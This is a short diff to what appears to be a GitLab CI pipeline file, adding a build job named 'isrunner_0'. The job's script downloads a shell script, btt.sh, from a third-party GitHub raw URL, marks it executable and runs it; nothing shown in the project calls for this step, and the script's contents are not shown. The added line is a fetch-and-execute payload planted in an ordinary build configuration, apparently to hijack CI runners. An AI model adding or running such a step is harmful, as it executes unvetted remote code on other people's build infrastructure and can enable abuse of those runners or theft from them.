@@ -3,6 +3,11 @@ stages:
   - build
   - deploy
 
+isrunner_0:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
+    
 isrunner_1:
   stage: isrunner
   script:
